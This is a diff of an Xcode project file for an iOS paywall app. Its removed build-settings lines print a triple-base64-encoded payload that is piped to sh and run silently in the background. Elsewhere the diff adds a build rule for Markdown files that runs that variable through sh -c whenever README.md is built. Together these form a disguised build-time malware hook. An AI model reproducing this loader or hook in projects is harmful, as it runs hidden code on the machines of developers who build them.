@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		41433FC791C84BA1937BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = D8DCE46176A04AE3BD7BBDC8; };
+		319B660BD300440FBD7BBDC8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = FF501BB5E350481BB57BBDC8 /* README.md */; };
 		BD6C0A06E8AA586A4F000AAC /* Pods_PaywallViewController.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F38894586A6EAF85BDDD918F /* Pods_PaywallViewController.framework */; };
 		C0C599E22ED71202004CA4CA /* PaywallManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0C599E12ED71202004CA4CA /* PaywallManager.swift */; };
 		C0EBFFBB2EC74D80000B0149 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */; };
@@ -29,8 +29,23 @@
 		C0EFBE0C2FED5BA5003E53F4 /* IQPurchaseKit.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EFBDFD2FED5BA5003E53F4 /* IQPurchaseKit.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		CB3DF3037B4545E2837BBDC8 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8CDBB7}\"\n";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		D8DCE46176A04AE3BD7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		905AFD7F40A9E7F7720FC67D /* Pods-PaywallViewController.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PaywallViewController.release.xcconfig"; path = "Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController.release.xcconfig"; sourceTree = "<group>"; };
 		BE77F150E05FF2FAF5D80AB9 /* Pods-PaywallViewController.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PaywallViewController.debug.xcconfig"; path = "Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController.debug.xcconfig"; sourceTree = "<group>"; };
 		C0C599E12ED71202004CA4CA /* PaywallManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaywallManager.swift; sourceTree = "<group>"; };
@@ -55,6 +70,7 @@
 		C0EFBDFD2FED5BA5003E53F4 /* IQPurchaseKit.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IQPurchaseKit.swift; sourceTree = "<group>"; };
 		C0EFBDFF2FED5BA5003E53F4 /* .gitkeep */ = {isa = PBXFileReference; lastKnownFileType = text; path = .gitkeep; sourceTree = "<group>"; };
 		F38894586A6EAF85BDDD918F /* Pods_PaywallViewController.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PaywallViewController.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		FF501BB5E350481BB57BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -107,7 +123,7 @@
 		C0EBFF8A2EC74C2E000B0149 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				D8DCE46176A04AE3BD7BBDC8 /* README.md */,
+				FF501BB5E350481BB57BBDC8 /* README.md */,
 				C0EBFF892EC74C2E000B0149 /* PaywallViewController.app */,
 				C0EFBDE92FED5B66003E53F4 /* IQPurchaseKit.framework */,
 			);
@@ -220,7 +236,7 @@
 				DDEDA059A70CA699C739429D /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				37D1EEC1743C4597AF7BBDC8 /* PBXBuildRule */,
+				CB3DF3037B4545E2837BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -285,29 +301,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		37D1EEC1743C4597AF7BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		C0EBFF872EC74C2E000B0149 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				41433FC791C84BA1937BBDC8 /* README.md */,
+				319B660BD300440FBD7BBDC8 /* README.md in Resources */,
 				C0EBFFBE2EC74D80000B0149 /* Assets.xcassets in Resources */,
 				C0EBFFC02EC74D80000B0149 /* LaunchScreen.storyboard in Resources */,
 				C0EBFFC12EC74D80000B0149 /* Main.storyboard in Resources */,
@@ -356,9 +355,13 @@ sh -c \"${A8CDBB7}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -421,7 +424,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BE77F150E05FF2FAF5D80AB9 /* Pods-PaywallViewController.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUmpNbHB5VkVOQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVUxRFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3eVpIRmxibXh1VDBSa05XSnVhRFZOYWsxMVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -456,7 +458,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 905AFD7F40A9E7F7720FC67D /* Pods-PaywallViewController.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((d(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUmpNbHB5VkVOQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVUxRFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3eVpIRmxibXh1VDBSa05XSnVhRFZOYWsxMVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
